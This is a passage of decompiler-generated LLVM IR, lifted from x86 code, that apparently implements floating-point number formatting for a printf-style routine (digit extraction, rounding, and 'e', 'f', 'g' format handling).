  %v7_804fdd1 = and i8 %v6_804fdd1, %stack_var_-207.0
  %v8_804fdd1 = icmp slt i8 %v7_804fdd1, 0
  %v9_804fdd1 = icmp eq i8 %v4_804fdd1, 0
  %v10_804fdd1 = icmp slt i8 %v4_804fdd1, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_804fde6 = icmp eq i1 %v10_804fdd1, %v8_804fdd1
  %v4_804fde6 = icmp eq i1 %v9_804fdd1, false
  %v5_804fde6 = and i1 %v4_804fde6, %v3_804fde6
  br i1 %v5_804fde6, label %dec_label_pc_804fded, label %dec_label_pc_804fde8

dec_label_pc_804fde8:                             ; preds = %dec_label_pc_804fdc3
  br label %dec_label_pc_804fded

dec_label_pc_804fded:                             ; preds = %dec_label_pc_804fdc3, %dec_label_pc_804fde8
  %v2_804fdf5 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804fdf5, i32* @ecx, align 4
  br label %dec_label_pc_80501be

dec_label_pc_804fdfe:                             ; preds = %dec_label_pc_804fd76, %bb180, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_804fe18 = xor i3 %v4_804fce8, -4
  store i3 %v3_804fe18, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_804fe1e

dec_label_pc_804fe1e:                             ; preds = %dec_label_pc_804fe6f, %dec_label_pc_804fdfe
  %v0_804fe6f = phi i32 [ 4096, %dec_label_pc_804fdfe ], [ %v2_804fe6f, %dec_label_pc_804fe6f ]
  %v2_804fe21 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_804fdfe ], [ %v2_804fe2180, %dec_label_pc_804fe6f ]
  %v1_804fe59 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_804fdfe ], [ %v0_804fe1e78, %dec_label_pc_804fe6f ]
  %v0_804fe6b65 = phi i32 [ 13, %dec_label_pc_804fdfe ], [ %v1_804fe20, %dec_label_pc_804fe6f ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_804fdfe ], [ %stack_var_-220.1, %dec_label_pc_804fe6f ]
  %v1_804fe20 = add i32 %v0_804fe6b65, -1
  %v4_804fe21 = fcmp ule x86_fp80 %v1_804fe59, %v2_804fe21
  br i1 %v4_804fe21, label %dec_label_pc_804fe48, label %dec_label_pc_804fe25

dec_label_pc_804fe25:                             ; preds = %dec_label_pc_804fe1e
  store x86_fp80 %v1_804fe59, x86_fp80* %st0.global-to-local, align 4
  %v3_804fe27 = mul i32 %v1_804fe20, 12
  store i32 %v3_804fe27, i32* %eax.global-to-local, align 4
  %v1_804fe2a = add i32 %v3_804fe27, ptrtoint (x86_fp80** @global_var_80548e0.190 to i32)
  %v2_804fe2a = inttoptr i32 %v1_804fe2a to x86_fp80*
  %v3_804fe2a = load x86_fp80, x86_fp80* %v2_804fe2a, align 4
  %v4_804fe30 = fmul x86_fp80 %v1_804fe59, %v3_804fe2a
  store x86_fp80 %v4_804fe30, x86_fp80* %st1.global-to-local, align 4
  %v4_804fe34 = fcmp ule x86_fp80 %v4_804fe30, %v3_804fe2a
  br i1 %v4_804fe34, label %dec_label_pc_804fe69, label %dec_label_pc_804fe38

dec_label_pc_804fe38:                             ; preds = %dec_label_pc_804fe25
  store x86_fp80 %v4_804fe30, x86_fp80* %st1.global-to-local, align 4
  %v5_804fe42 = sub i32 %stack_var_-220.0, %v0_804fe6f
  br label %dec_label_pc_804fe6b

dec_label_pc_804fe48:                             ; preds = %dec_label_pc_804fe1e
  %v3_804fe48 = mul i32 %v1_804fe20, 12
  store i32 %v3_804fe48, i32* %eax.global-to-local, align 4
  %v1_804fe4b = add i32 %v3_804fe48, ptrtoint (x86_fp80** @global_var_80548e0.190 to i32)
  %v2_804fe4b = inttoptr i32 %v1_804fe4b to x86_fp80*
  %v3_804fe4b = load x86_fp80, x86_fp80* %v2_804fe4b, align 4
  %v4_804fe51 = fdiv x86_fp80 %v3_804fe4b, %v1_804fe59
  store x86_fp80 %v4_804fe51, x86_fp80* %st1.global-to-local, align 4
  %v4_804fe53 = fcmp ogt x86_fp80 %v3_804fe4b, %v1_804fe59
  br i1 %v4_804fe53, label %.thread54, label %bb182

.thread54:                                        ; preds = %dec_label_pc_804fe48
  store x86_fp80 %v3_804fe4b, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804fe59

bb182:                                            ; preds = %dec_label_pc_804fe48
  %v5_804fe53 = fcmp olt x86_fp80 %v3_804fe4b, %v1_804fe59
  br i1 %v5_804fe53, label %.thread50, label %bb183

.thread50:                                        ; preds = %bb182
  store x86_fp80 %v3_804fe4b, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804fe69

bb183:                                            ; preds = %bb182
  %not.v6_804fe53 = fcmp une x86_fp80 %v3_804fe4b, %v1_804fe59
  store x86_fp80 %v3_804fe4b, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_804fe53, label %dec_label_pc_804fe69, label %dec_label_pc_804fe59

dec_label_pc_804fe59:                             ; preds = %.thread54, %bb183
  store x86_fp80 %v3_804fe4b, x86_fp80* %st1.global-to-local, align 4
  %v5_804fe63 = add i32 %stack_var_-220.0, %v0_804fe6f
  br label %dec_label_pc_804fe6b

dec_label_pc_804fe69:                             ; preds = %dec_label_pc_804fe25, %.thread50, %bb183
  %v1_804fe69 = phi x86_fp80 [ %v1_804fe59, %.thread50 ], [ %v1_804fe59, %bb183 ], [ %v3_804fe2a, %dec_label_pc_804fe25 ]
  %v0_804fe1e79 = phi x86_fp80 [ %v3_804fe4b, %.thread50 ], [ %v3_804fe4b, %bb183 ], [ %v4_804fe30, %dec_label_pc_804fe25 ]
  store x86_fp80 %v1_804fe69, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804fe6b

dec_label_pc_804fe6b:                             ; preds = %dec_label_pc_804fe59, %dec_label_pc_804fe38, %dec_label_pc_804fe69
  %v2_804fe2180 = phi x86_fp80 [ %v1_804fe69, %dec_label_pc_804fe69 ], [ %v2_804fe21, %dec_label_pc_804fe59 ], [ %v1_804fe59, %dec_label_pc_804fe38 ]
  %v0_804fe1e78 = phi x86_fp80 [ %v0_804fe1e79, %dec_label_pc_804fe69 ], [ %v3_804fe4b, %dec_label_pc_804fe59 ], [ %v4_804fe30, %dec_label_pc_804fe38 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_804fe69 ], [ %v5_804fe63, %dec_label_pc_804fe59 ], [ %v5_804fe42, %dec_label_pc_804fe38 ]
  %v1_804fe6b = icmp eq i32 %v1_804fe20, 0
  br i1 %v1_804fe6b, label %.thread59, label %dec_label_pc_804fe6f

dec_label_pc_804fe6f:                             ; preds = %dec_label_pc_804fe6b
  %v2_804fe6f = sdiv i32 %v0_804fe6f, 2
  store i32 %v2_804fe6f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fe1e

.thread59:                                        ; preds = %dec_label_pc_804fe6b
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804fe93

dec_label_pc_804fe93:                             ; preds = %dec_label_pc_804fd76, %.thread59
  %v0_804ff4d = phi i32 [ %stack_var_-220.1, %.thread59 ], [ -1, %dec_label_pc_804fd76 ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread59 ], [ 0xK3FFF8000000000000000, %dec_label_pc_804fd76 ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_804fe97 = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_804fd6e, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_804feaa = and i32 %v2_804fe97, -65536
  %v1_804feaf = udiv i16 %tmp145, 256
  %v2_804feaf = zext i16 %v1_804feaf to i32
  %v3_804feaf = or i32 %v2_804feaf, 12
  %v10_804feaf = mul nuw nsw i32 %v3_804feaf, 256
  %tmp193 = urem i16 %tmp145, 256
  %v4_804feaa.masked = zext i16 %tmp193 to i32
  %v11_804feaf = or i32 %v10_804feaf, %v4_804feaa.masked
  %v12_804feaf = or i32 %v11_804feaf, %v6_804feaa
  store i32 %v12_804feaf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804feb7

dec_label_pc_804feb7:                             ; preds = %dec_label_pc_804ff09.dec_label_pc_804feb7_crit_edge, %dec_label_pc_804fe93
  %v2_804fedc = phi x86_fp80 [ %storemerge, %dec_label_pc_804fe93 ], [ %v2_804fedc.pre, %dec_label_pc_804ff09.dec_label_pc_804feb7_crit_edge ]
  %v1_804feb7 = phi i3 [ %v1_804fd6e, %dec_label_pc_804fe93 ], [ %v1_804feb7.pre, %dec_label_pc_804ff09.dec_label_pc_804feb7_crit_edge ]
  %v3_804fede = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_804fe93 ], [ %v0_804feb7.pre, %dec_label_pc_804ff09.dec_label_pc_804feb7_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_804fe97, %dec_label_pc_804fe93 ], [ %v4_804fed7, %dec_label_pc_804ff09.dec_label_pc_804feb7_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp194 = fptosi x86_fp80 %v3_804fede to i32
  store i32 %tmp194, i32* %eax.global-to-local, align 4
  store i32 %tmp194, i32* %ecx.global-to-local, align 4
  %v5_804fed1 = sitofp i32 %tmp194 to x86_fp80
  %v4_804fed7 = add i32 %stack_var_-212.0, 9
  %v4_804fedc = fsub x86_fp80 %v2_804fedc, %v5_804fed1
  store i3 %v1_804feb7, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804fede = fmul x86_fp80 %v3_804fede, %v4_804fedc
  store x86_fp80 %v4_804fede, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804fee0

dec_label_pc_804fee0:                             ; preds = %dec_label_pc_804fee0.dec_label_pc_804fee0_crit_edge, %dec_label_pc_804feb7
  %v0_804fef4 = phi i32 [ %v0_804fef4.pre, %dec_label_pc_804fee0.dec_label_pc_804fee0_crit_edge ], [ %tmp194, %dec_label_pc_804feb7 ]
  %v0_804fee4 = phi i32 [ %v0_804fee4.pre, %dec_label_pc_804fee0.dec_label_pc_804fee0_crit_edge ], [ 0, %dec_label_pc_804feb7 ]
  %v1_804fee4 = add i32 %v0_804fee4, 1
  store i32 %v1_804fee4, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_804feee = sub i32 %v4_804fed7, %v1_804fee4
  %div = udiv i32 %v0_804fef4, 10
  %tmp184 = urem i32 %v0_804fef4, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_804fefa = and i32 %div, 536870656
  store i32 %v2_804feee, i32* %edx.global-to-local, align 4
  %v1_804ff00 = trunc i32 %tmp184 to i8
  %v2_804ff00 = or i8 %v1_804ff00, 48
  %v12_804ff00 = zext i8 %v2_804ff00 to i32
  %v15_804ff00 = or i32 %v12_804ff00, %v3_804fefa
  store i32 %v15_804ff00, i32* %eax.global-to-local, align 4
  %v3_804ff05 = inttoptr i32 %v2_804feee to i8*
  store i8 %v2_804ff00, i8* %v3_804ff05, align 1
  %v7_804ff07 = icmp sgt i32 %v1_804fee4, 8
  br i1 %v7_804ff07, label %dec_label_pc_804ff09, label %dec_label_pc_804fee0.dec_label_pc_804fee0_crit_edge

dec_label_pc_804fee0.dec_label_pc_804fee0_crit_edge: ; preds = %dec_label_pc_804fee0
  %v0_804fee4.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_804fef4.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fee0

dec_label_pc_804ff09:                             ; preds = %dec_label_pc_804fee0
  %v0_804ff09 = load i32, i32* @edi, align 4
  %v1_804ff09 = add i32 %v0_804ff09, 1
  store i32 %v1_804ff09, i32* @edi, align 4
  %v7_804ff0d = icmp sgt i32 %v1_804ff09, 2
  br i1 %v7_804ff0d, label %dec_label_pc_804ff0f, label %dec_label_pc_804ff09.dec_label_pc_804feb7_crit_edge

dec_label_pc_804ff09.dec_label_pc_804feb7_crit_edge: ; preds = %dec_label_pc_804ff09
  %v0_804feb7.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_804feb7.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_804fedc.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804feb7

dec_label_pc_804ff0f:                             ; preds = %dec_label_pc_804ff09
  %v0_804ff0f = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804ff0f = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_804ff0f, x86_fp80* %st0.global-to-local, align 4
  %v2_804ff11 = add i3 %v0_804ff0f, 2
  store i3 %v2_804ff11, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804ff13 = add i8 %stack_var_-207.0, -96
  %v6_804ff13 = sub i8 95, %stack_var_-207.0
  %v7_804ff13 = and i8 %v6_804ff13, %stack_var_-207.0
  %v8_804ff13 = icmp slt i8 %v7_804ff13, 0
  %v9_804ff13 = icmp eq i8 %v4_804ff13, 0
  %v10_804ff13 = icmp slt i8 %v4_804ff13, 0
  %v3_804ff18 = icmp eq i1 %v10_804ff13, %v8_804ff13
  %v4_804ff18 = icmp eq i1 %v9_804ff13, false
  %v5_804ff18 = and i1 %v4_804ff18, %v3_804ff18
  br i1 %v5_804ff18, label %dec_label_pc_804ff27, label %dec_label_pc_804ff1a

dec_label_pc_804ff1a:                             ; preds = %dec_label_pc_804ff0f
  %v4_804ff1a = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_804ff27

dec_label_pc_804ff27:                             ; preds = %dec_label_pc_804ff0f, %dec_label_pc_804ff1a
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_804ff0f ], [ %v4_804ff1a, %dec_label_pc_804ff1a ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_804ff0f ], [ 69, %dec_label_pc_804ff1a ]
  %v12_804ff27 = icmp eq i8 %stack_var_-207.1, 103
  %v1_804ff2c = icmp eq i1 %v12_804ff27, false
  br i1 %v1_804ff2c, label %dec_label_pc_804ff35, label %dec_label_pc_804ff2e

dec_label_pc_804ff2e:                             ; preds = %dec_label_pc_804ff27
  %v0_804ff2e = load i32, i32* %ebp.global-to-local, align 4
  %tmp185 = icmp slt i32 %v0_804ff2e, 1
  br i1 %tmp185, label %dec_label_pc_804ff3c, label %dec_label_pc_804ff32

dec_label_pc_804ff32:                             ; preds = %dec_label_pc_804ff2e
  %v1_804ff32 = add i32 %v0_804ff2e, -1
  store i32 %v1_804ff32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ff3c

dec_label_pc_804ff35:                             ; preds = %dec_label_pc_804ff27
  %v12_804ff35 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_804ff35, label %dec_label_pc_804ff40, label %dec_label_pc_804ff35.dec_label_pc_804ff3c_crit_edge

dec_label_pc_804ff35.dec_label_pc_804ff3c_crit_edge: ; preds = %dec_label_pc_804ff35
  %v0_804ff3c.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ff3c

dec_label_pc_804ff3c:                             ; preds = %dec_label_pc_804ff35.dec_label_pc_804ff3c_crit_edge, %dec_label_pc_804ff2e, %dec_label_pc_804ff32
  %v0_804ff3c = phi i32 [ %v0_804ff3c.pre, %dec_label_pc_804ff35.dec_label_pc_804ff3c_crit_edge ], [ %v0_804ff2e, %dec_label_pc_804ff2e ], [ %v1_804ff32, %dec_label_pc_804ff32 ]
  store i32 %v0_804ff3c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ff6d

dec_label_pc_804ff40:                             ; preds = %dec_label_pc_804ff35
  store i32 %v0_804ff4d, i32* %eax.global-to-local, align 4
  %v0_804ff44 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ff44 = add i32 %v0_804ff44, %v0_804ff4d
  store i32 %v2_804ff44, i32* %ebx.global-to-local, align 4
  %v5_804ff4b = icmp slt i32 %v2_804ff44, -1
  br i1 %v5_804ff4b, label %dec_label_pc_804ff4d, label %dec_label_pc_804ff6d

dec_label_pc_804ff4d:                             ; preds = %dec_label_pc_804ff40
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804ff55 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804ff55, i32* %eax.global-to-local, align 4
  %v4_804ff5d = bitcast i32* %stack_var_-72 to i8*
  %v5_804ff5d = call i32 @function_804d1d0(i8* %v4_804ff5d, i32 48, i32 21)
  store i32 %v5_804ff5d, i32* %eax.global-to-local, align 4
  %v0_804ff6d.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ff6d

dec_label_pc_804ff6d:                             ; preds = %dec_label_pc_804ff40, %dec_label_pc_804ff4d, %dec_label_pc_804ff3c
  %v1_804ff8d = phi i32 [ %v0_804ff3c, %dec_label_pc_804ff3c ], [ %v2_804ff44, %dec_label_pc_804ff40 ], [ %v0_804ff6d.pr.pre, %dec_label_pc_804ff4d ]
  %stack_var_-220.3 = phi i32 [ %v0_804ff4d, %dec_label_pc_804ff3c ], [ %v0_804ff4d, %dec_label_pc_804ff40 ], [ -1, %dec_label_pc_804ff4d ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_804ff80 = icmp sgt i32 %v1_804ff8d, 20
  br i1 %v7_804ff80, label %dec_label_pc_804ff82, label %dec_label_pc_804ff8d

dec_label_pc_804ff82:                             ; preds = %dec_label_pc_804ff6d
  %v2_804ff82 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_804ff82, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ffa1.preheader

dec_label_pc_804ff8d:                             ; preds = %dec_label_pc_804ff6d
  %v0_804ff8d = load i32, i32* @esp, align 4
  %v2_804ff8d = add i32 %v1_804ff8d, 165
  %v3_804ff8d = add i32 %v2_804ff8d, %v0_804ff8d
  store i32 %v3_804ff8d, i32* %eax.global-to-local, align 4
  %v1_804ff94 = add i32 %v3_804ff8d, 2
  %v2_804ff94 = inttoptr i32 %v1_804ff94 to i8*
  %v3_804ff94 = load i8, i8* %v2_804ff94, align 1
  %v4_804ff94 = add i8 %v3_804ff94, -53
  %v9_804ff94 = sub i8 52, %v3_804ff94
  %v10_804ff94 = and i8 %v9_804ff94, %v3_804ff94
  %v11_804ff94 = icmp slt i8 %v10_804ff94, 0
  %v13_804ff94 = icmp slt i8 %v4_804ff94, 0
  store i32 %v1_804ff94, i32* %ecx.global-to-local, align 4
  %v2_804ff9b = icmp eq i1 %v13_804ff94, %v11_804ff94
  %v3_804ff9b = zext i1 %v2_804ff9b to i32
  br label %dec_label_pc_804ffa1.preheader

dec_label_pc_804ffa1.preheader:                   ; preds = %dec_label_pc_804ff8d, %dec_label_pc_804ff82
  %v0_804ffa1101 = phi i32 [ %v1_804ff94, %dec_label_pc_804ff8d ], [ %v2_804ff82, %dec_label_pc_804ff82 ]
  %storemerge70 = phi i32 [ %v3_804ff9b, %dec_label_pc_804ff8d ], [ 0, %dec_label_pc_804ff82 ]
  store i32 %storemerge70, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ffa1

dec_label_pc_804ffa1:                             ; preds = %dec_label_pc_804ffa1.backedge, %dec_label_pc_804ffa1.preheader
  %v3_804ffa2 = phi i32 [ %v3_804ffa2.pre, %dec_label_pc_804ffa1.backedge ], [ %storemerge70, %dec_label_pc_804ffa1.preheader ]
  %v0_804ffa1 = phi i32 [ %v0_804ffa4, %dec_label_pc_804ffa1.backedge ], [ %v0_804ffa1101, %dec_label_pc_804ffa1.preheader ]
  %v1_804ffa1 = add i32 %v0_804ffa1, -1
  store i32 %v1_804ffa1, i32* %ecx.global-to-local, align 4
  %v1_804ffa2 = inttoptr i32 %v1_804ffa1 to i8*
  %v2_804ffa2 = load i8, i8* %v1_804ffa2, align 1
  %v4_804ffa2 = trunc i32 %v3_804ffa2 to i8
  %v5_804ffa2 = add i8 %v2_804ffa2, %v4_804ffa2
  store i8 %v5_804ffa2, i8* %v1_804ffa2, align 1
  %v0_804ffa4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ffa4 = inttoptr i32 %v0_804ffa4 to i8*
  %v2_804ffa4 = load i8, i8* %v1_804ffa4, align 1
  %v3_804ffa4 = zext i8 %v2_804ffa4 to i32
  %v4_804ffa4 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ffa4 = and i32 %v4_804ffa4, -256
  %v6_804ffa4 = or i32 %v5_804ffa4, %v3_804ffa4
  store i32 %v6_804ffa4, i32* %edx.global-to-local, align 4
  %v7_804ffa6 = icmp eq i8 %v2_804ffa4, 48
  br i1 %v7_804ffa6, label %dec_label_pc_804ffa1.backedge, label %dec_label_pc_804ffab

dec_label_pc_804ffa1.backedge:                    ; preds = %dec_label_pc_804ffa1, %dec_label_pc_804ffab
  %v3_804ffa2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ffa1

dec_label_pc_804ffab:                             ; preds = %dec_label_pc_804ffa1
  %v2_804ffab = add i8 %v2_804ffa4, -57
  %v7_804ffab = sub i8 56, %v2_804ffa4
  %v8_804ffab = and i8 %v7_804ffab, %v2_804ffa4
  %v9_804ffab = icmp slt i8 %v8_804ffab, 0
  %v10_804ffab = icmp eq i8 %v2_804ffab, 0
  %v11_804ffab = icmp slt i8 %v2_804ffab, 0
  %v3_804ffae = icmp eq i1 %v11_804ffab, %v9_804ffab
  %v4_804ffae = icmp eq i1 %v10_804ffab, false
  %v5_804ffae = and i1 %v4_804ffae, %v3_804ffae
  br i1 %v5_804ffae, label %dec_label_pc_804ffa1.backedge, label %dec_label_pc_804ffb0

dec_label_pc_804ffb0:                             ; preds = %dec_label_pc_804ffab
  %v2_804ffb0 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_804ffb0, i32* %eax.global-to-local, align 4
  %tmp195 = icmp ugt i32 %v0_804ffa4, %v2_804ffb0
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp195, label %dec_label_pc_804ffbb, label %dec_label_pc_804ffc8

dec_label_pc_804ffbb:                             ; preds = %dec_label_pc_804ffb0
  store i32 %v2_804fe97, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ffd1

dec_label_pc_804ffc8:                             ; preds = %dec_label_pc_804ffb0
  store i32 %v2_804ffb0, i32* %edx.global-to-local, align 4
  store i32 %v2_804ffb0, i32* %ecx.global-to-local, align 4
  %v1_804ffd0 = add i32 %stack_var_-220.3, 1
  store i32 %v1_804ffd0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ffd1

dec_label_pc_804ffd1:                             ; preds = %dec_label_pc_804ffbb, %dec_label_pc_804ffc8
  %v0_804ffd1 = phi i32 [ %v0_804ffa4, %dec_label_pc_804ffbb ], [ %v2_804ffb0, %dec_label_pc_804ffc8 ]
  %v1_804ffd1 = add i32 %v0_804ffd1, 1
  store i32 %v1_804ffd1, i32* %eax.global-to-local, align 4
  %v2_804ffd8 = inttoptr i32 %v1_804ffd1 to i8*
  store i8 0, i8* %v2_804ffd8, align 1
  br i1 %v1_804ff2c, label %dec_label_pc_804fffe, label %dec_label_pc_804ffe3

dec_label_pc_804ffe3:                             ; preds = %dec_label_pc_804ffd1
  %v0_804ffe3 = load i32, i32* %esi.global-to-local, align 4
  %v5_804ffe6 = icmp slt i32 %v0_804ffe3, -4
  br i1 %v5_804ffe6, label %dec_label_pc_805000b, label %dec_label_pc_804ffe8

dec_label_pc_804ffe8:                             ; preds = %dec_label_pc_804ffe3
  %v1_804ffe8 = load i32, i32* %ebx.global-to-local, align 4
  %v7_804ffea = icmp slt i32 %v1_804ffe8, %v0_804ffe3
  br i1 %v7_804ffea, label %dec_label_pc_805000b, label %dec_label_pc_804fff3

dec_label_pc_804fff3:                             ; preds = %dec_label_pc_804ffe8
  %v2_804fff5 = sub i32 %v1_804ffe8, %v0_804ffe3
  store i32 %v2_804fff5, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805000f

dec_label_pc_804fffe:                             ; preds = %dec_label_pc_804ffd1
  %v4_804fffe = zext i8 %stack_var_-207.1 to i32
  %v5_804fffe = load i32, i32* %ebx.global-to-local, align 4
  %v6_804fffe = and i32 %v5_804fffe, -256
  %v7_804fffe = or i32 %v6_804fffe, %v4_804fffe
  store i32 %v7_804fffe, i32* %ebx.global-to-local, align 4
  %v10_8050002 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_8050002, label %dec_label_pc_804fffe.dec_label_pc_805000f_crit_edge, label %dec_label_pc_805000b

dec_label_pc_804fffe.dec_label_pc_805000f_crit_edge: ; preds = %dec_label_pc_804fffe
  %v0_805000f.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805000f

dec_label_pc_805000b:                             ; preds = %dec_label_pc_804ffe3, %dec_label_pc_804ffe8, %dec_label_pc_804fffe
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_804fffe ], [ 103, %dec_label_pc_804ffe8 ], [ 103, %dec_label_pc_804ffe3 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050019

dec_label_pc_805000f:                             ; preds = %dec_label_pc_804fffe.dec_label_pc_805000f_crit_edge, %dec_label_pc_804fff3
  %v0_8050011 = phi i32 [ %v0_805000f.pre, %dec_label_pc_804fffe.dec_label_pc_805000f_crit_edge ], [ %v0_804ffe3, %dec_label_pc_804fff3 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_804fffe.dec_label_pc_805000f_crit_edge ], [ 102, %dec_label_pc_804fff3 ]
  %v2_805000f = icmp slt i32 %v0_8050011, 0
  store i32 %v0_8050011, i32* %ebx.global-to-local, align 4
  %v1_8050013 = icmp eq i1 %v2_805000f, false
  br i1 %v1_8050013, label %dec_label_pc_8050019, label %dec_label_pc_8050015

dec_label_pc_8050015:                             ; preds = %dec_label_pc_805000f
  %v0_8050015 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050015 = add i32 %v0_8050015, -1
  store i32 %v1_8050015, i32* %edx.global-to-local, align 4
  %v1_8050016 = inttoptr i32 %v1_8050015 to i8*
  store i8 48, i8* %v1_8050016, align 1
  %v0_805004e.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050019

dec_label_pc_8050019:                             ; preds = %dec_label_pc_805000f, %dec_label_pc_805000b, %dec_label_pc_8050015
  %v1_80500a9 = phi i32 [ %v0_8050011, %dec_label_pc_805000f ], [ %v0_805004e.pre, %dec_label_pc_8050015 ], [ 0, %dec_label_pc_805000b ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_805000f ], [ %stack_var_-197.1, %dec_label_pc_8050015 ], [ %stack_var_-197.0, %dec_label_pc_805000b ]
  %v2_8050019 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8050019, i32* %eax.global-to-local, align 4
  %v0_8050028 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050028 = add i32 %v0_8050028, 1
  store i32 %v1_8050028, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_8050037 = inttoptr i32 %v0_8050028 to i8*
  %v2_8050037 = load i8, i8* %v1_8050037, align 1
  %v3_8050037 = zext i8 %v2_8050037 to i32
  %v5_8050037 = and i32 %v2_8050019, -256
  %v6_8050037 = or i32 %v3_8050037, %v5_8050037
  store i32 %v6_8050037, i32* %eax.global-to-local, align 4
  store i32 %v6_8050037, i32* %stack_var_-22, align 4
  %v2_805004c = sub i32 %v1_804ffd1, %v1_8050028
  store i32 %v2_805004c, i32* %edx.global-to-local, align 4
  %v1_805004e = icmp eq i32 %v1_80500a9, 0
  %v2_805004e = icmp slt i32 %v1_80500a9, 0
  br i1 %v2_805004e, label %dec_label_pc_805009d, label %dec_label_pc_8050052

dec_label_pc_8050052:                             ; preds = %dec_label_pc_8050019
  %v2_8050052 = sub i32 %v1_80500a9, %v2_805004c
  %v8_8050052 = xor i32 %v2_805004c, %v1_80500a9
  %v9_8050052 = xor i32 %v2_8050052, %v1_80500a9
  %v10_8050052 = and i32 %v9_8050052, %v8_8050052
  %v11_8050052 = icmp slt i32 %v10_8050052, 0
  %v13_8050052 = icmp slt i32 %v2_8050052, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8050060 = icmp eq i1 %v13_8050052, %v11_8050052
  br i1 %v2_8050060, label %dec_label_pc_8050062, label %dec_label_pc_8050096

dec_label_pc_8050062:                             ; preds = %dec_label_pc_8050052
  store i32 %v2_8050052, i32* %eax.global-to-local, align 4
  %tmp186 = icmp slt i32 %v2_8050052, 1
  %tmp187 = icmp eq i1 %tmp186, false
  br i1 %tmp187, label %dec_label_pc_8050077, label %dec_label_pc_8050092

dec_label_pc_8050077:                             ; preds = %dec_label_pc_8050062
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8050092

dec_label_pc_8050092:                             ; preds = %dec_label_pc_8050062, %dec_label_pc_8050077
